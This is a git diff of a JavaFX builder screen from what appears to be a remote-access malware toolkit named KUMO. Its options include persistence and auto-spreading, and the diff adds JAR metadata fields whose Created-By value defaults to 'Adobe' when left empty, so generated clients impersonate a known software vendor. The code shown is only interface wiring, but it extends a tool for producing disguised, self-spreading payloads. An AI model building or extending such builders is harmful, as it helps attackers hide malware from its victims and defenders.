@@ -10,12 +10,11 @@ import Logger.Logger;
 import Server.Data.PseudoBase;
 import Server.KumoSettings;
 import javafx.geometry.Insets;
-import javafx.scene.control.Button;
-import javafx.scene.control.CheckBox;
-import javafx.scene.control.Label;
-import javafx.scene.control.TextField;
+import javafx.scene.control.*;
 import javafx.scene.layout.BorderPane;
+import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
+import javafx.scene.layout.Priority;
 
 import java.io.IOException;
 
@@ -24,15 +23,52 @@ class ClientBuilderView {
     private CheckBox persistent;
     private CheckBox autoSpread;
     private CheckBox debug;
+    private TextField jarCreatedBy;
+    private TextField jarVersion;
 
     BorderPane getClientBuilderView() {
         BorderPane borderPane = new BorderPane();
         borderPane.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
         borderPane.setTop(new TopBar().getTopBar(KUMO.Kumo.getPrimaryStage()));
         borderPane.setLeft(clientBuilderSettingsLeft());
+        borderPane.setRight(jarSettingsRight());
         borderPane.setCenter(clientBuilderSettingsCenter());
         borderPane.setBottom(new BottomBar().getBottomBar());
         return borderPane;
+    }
+
+    private HBox jarSettingsRight(){
+        HBox hbox = Styler.hContainer(20);
+        hbox.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
+        hbox.setId("clientBuilder");
+        hbox.setPadding(new Insets(75, 20, 20, 20));
+        // Created-By
+        Label createdByLabel = (Label) Styler.styleAdd(new Label("Created By: "), "label-bright");
+        jarCreatedBy = new TextField();
+
+        // Version
+        Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Version: "), "label-bright");
+        jarVersion = new TextField();
+
+        TitledPane jarSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
+        GridPane grid = new GridPane();
+        grid.setId("java-settings");
+        grid.setVgap(4);
+        grid.setPadding(new Insets(5, 5, 5, 5));
+
+        // Add elements to grid
+        grid.add(createdByLabel, 0,0);
+        grid.add(jarCreatedBy, 1, 0);
+        grid.add(jarVersionLabel, 0, 1);
+        grid.add(jarVersion, 1, 1);
+
+        jarSettings.setLayoutY(10);
+        jarSettings.setText("JAR Settings");
+        jarSettings.setExpanded(false);
+        jarSettings.setAnimated(true);
+        jarSettings.setContent(grid);
+        hbox.getChildren().add(Styler.vContainer(20, jarSettings));
+        return hbox;
     }
 
     private HBox clientBuilderSettingsLeft() {
@@ -75,6 +111,7 @@ class ClientBuilderView {
         HBox clientNameBox = Styler.hContainer(clientNameLabel, clientName);
         clientName.setEditable(true);
 
+
         Button buildClient = new Button("Build");
         buildClient.setPrefWidth(150);
         buildClient.setPrefHeight(50);
@@ -107,9 +144,19 @@ class ClientBuilderView {
                     Logger.log(Level.ERROR, e.toString());
                 }
             }
+            if ((!jarCreatedBy.getText().equals(""))){
+                ClientBuilder.jarCreatedBy = jarCreatedBy.getText();
+            } else {
+                ClientBuilder.jarCreatedBy = "Adobe";
+            }
+            if ((!jarVersion.getText().equals(""))){
+                ClientBuilder.jarVersion = jarVersion.getText();
+            }
         });
-        hBox.getChildren().add(Styler.vContainer(20, title, serverIPBox, portBox, clientNameBox, buildClient));
 
+
+        hBox.getChildren().add(Styler.vContainer(20, title, serverIPBox, portBox, clientNameBox, buildClient));
+        HBox.setHgrow(hBox, Priority.ALWAYS);
         return hBox;
     }
 }
